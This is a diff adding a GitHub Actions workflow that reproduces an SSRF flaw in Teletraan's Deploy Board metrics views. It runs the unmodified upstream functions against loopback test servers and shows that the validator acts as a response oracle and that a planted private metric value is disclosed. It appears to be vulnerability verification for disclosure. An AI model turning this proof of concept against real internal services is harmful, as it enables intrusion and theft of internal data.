@@ -1,0 +1,138 @@
+name: Teletraan Metrics SSRF Source-Native Local Verification
+
+on:
+  pull_request:
+    paths:
+      - '.github/workflows/teletraan-metrics-ssrf-20261113.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  original-code-metrics-ssrf:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Checkout exact unmodified upstream source
+        run: |
+          git clone --depth 1 https://github.com/pinterest/teletraan.git upstream
+          cd upstream
+          test "$(git rev-parse HEAD)" = b5212f5ab50486d623fcb493cca36558c70ee467
+          test -z "$(git status --porcelain)"
+      - name: Create ephemeral trusted HTTPS server certificate for local-only target
+        run: |
+          openssl req -x509 -newkey rsa:2048 -nodes -days 1 -keyout /tmp/lab-metrics.key -out /tmp/lab-metrics.crt -subj '/CN=127.0.0.1' -addext 'subjectAltName=IP:127.0.0.1' >/dev/null 2>&1
+      - name: Call ORIGINAL Deploy Board view functions against loopback-only HTTP/HTTPS target
+        env:
+          SSL_CERT_FILE: /tmp/lab-metrics.crt
+        run: |
+          python3 - <<'PY'
+          import ast
+          import json
+          import os
+          import ssl
+          import threading
+          import urllib.request
+          import urllib.error
+          from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+          from pathlib import Path
+          from types import SimpleNamespace
+
+          # The application code is never modified or rewritten in this test.
+          source_path=Path('upstream/deploy-board/deploy_board/webapp/util_views.py')
+          src=source_path.read_text()
+          tree=ast.parse(src,filename=str(source_path))
+          names={'validate_metrics_url','get_service_metrics','_get_latest_metrics','_convert_opentsdb_data'}
+          original_functions=[n for n in tree.body if isinstance(n,ast.FunctionDef) and n.name in names]
+          assert {n.name for n in original_functions} == names
+          routes=Path('upstream/deploy-board/deploy_board/webapp/urls.py').read_text()
+          assert r'^validate_metrics_url/$' in routes
+          assert 'util_views.validate_metrics_url' in routes
+          assert 'util_views.get_service_metrics' in routes
+          settings=Path('upstream/deploy-board/deploy_board/settings.py').read_text()
+          assert 'STATSBOARD_API_PREFIX = os.getenv("STATSBOARD_API_PREFIX", "https://")' in settings
+
+          hits={'https':[], 'http':[]}
+          class HTTPSHandler(BaseHTTPRequestHandler):
+              def do_GET(self):
+                  hits['https'].append(self.path)
+                  if self.path=='/valid':
+                      payload=[{'datapoints': [[1000,42]]}]
+                  else:
+                      payload=[{'not_metrics': 1}]
+                  data=json.dumps(payload).encode()
+                  self.send_response(200)
+                  self.send_header('Content-Type','application/json')
+                  self.send_header('Content-Length',str(len(data)))
+                  self.end_headers()
+                  self.wfile.write(data)
+              def log_message(self,*args):pass
+
+          class HTTPHandler(BaseHTTPRequestHandler):
+              def do_GET(self):
+                  hits['http'].append(self.path)
+                  data=json.dumps({'data':[{'datapoints': [[1000,'PRIVATE_LAB_ONLY_METRIC_SECRET']]}]}).encode()
+                  self.send_response(200)
+                  self.send_header('Content-Type','application/json')
+                  self.send_header('Content-Length',str(len(data)))
+                  self.end_headers()
+                  self.wfile.write(data)
+              def log_message(self,*args):pass
+
+          tls=ThreadingHTTPServer(('127.0.0.1',19443),HTTPSHandler)
+          ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+          ctx.load_cert_chain('/tmp/lab-metrics.crt','/tmp/lab-metrics.key')
+          tls.socket=ctx.wrap_socket(tls.socket,server_side=True)
+          plain=ThreadingHTTPServer(('127.0.0.1',19080),HTTPHandler)
+          for srv in (tls,plain):
+              threading.Thread(target=srv.serve_forever,daemon=True).start()
+
+          class HttpResponse:
+              def __init__(self,body,content_type=None):
+                  self.content=body.encode() if isinstance(body,str) else body
+                  self.status_code=200
+          class EnvironsHelper:
+              @staticmethod
+              def get_env_metrics_config(request,name,stage):
+                  assert name=='auditlab' and stage=='dev'
+                  return [{'title':'private_mirror','url':'http://127.0.0.1:19080/private'}]
+
+          globals_for_native={
+              'json':json,
+              'urllib':__import__('urllib'),
+              'log':SimpleNamespace(warning=lambda *a:None),
+              'STATSBOARD_API_PREFIX':'https://',
+              'HttpResponse':HttpResponse,
+              'environs_helper':EnvironsHelper
+          }
+          exec(compile(ast.Module(body=original_functions,type_ignores=[]),str(source_path),'exec'),globals_for_native)
+
+          validate=globals_for_native['validate_metrics_url']
+          fetch=globals_for_native['get_service_metrics']
+          def req(url):
+              return SimpleNamespace(POST={'newEntryValue':url})
+
+          # Native view rejects nonmatching scheme BEFORE outbound request.
+          denied=json.loads(validate(req('http://127.0.0.1:19080/blocked')).content)
+          assert denied=={'result':False} and not hits['http']
+          print('PREFIX_CONTROL_HTTP_BLOCKED=TRUE')
+
+          accepted=json.loads(validate(req('https://127.0.0.1:19443/valid')).content)
+          assert accepted=={'result':True} and hits['https']==['/valid']
+          print('VALIDATOR_HTTPS_LOOPBACK_REQUEST_FROM_SERVER=TRUE')
+          print('VALIDATOR_RESPONSE_ORACLE_TRUE=TRUE')
+
+          invalid=json.loads(validate(req('https://127.0.0.1:19443/no_metrics')).content)
+          assert invalid=={'result':False} and hits['https']==['/valid','/no_metrics']
+          print('VALIDATOR_RESPONSE_ORACLE_FALSE=TRUE')
+
+          output=json.loads(fetch(SimpleNamespace(),'auditlab','dev').content)
+          assert hits['http']==['/private'],hits['http']
+          assert output['html']['private_mirror']==[[1000,'PRIVATE_LAB_ONLY_METRIC_SECRET']]
+          print('STORED_METRICS_PRIVATE_LOOPBACK_GET=TRUE')
+          print('PRIVATE_METRIC_VALUE_DISCLOSED_VIA_SERVICE_METRICS_RESPONSE=TRUE')
+          print('NATIVE_VIEW_SSRF_REPRODUCTION=PASS')
+          print('SCOPE: source-native view invocation, not full Django HTTP/authentication E2E.')
+          PY
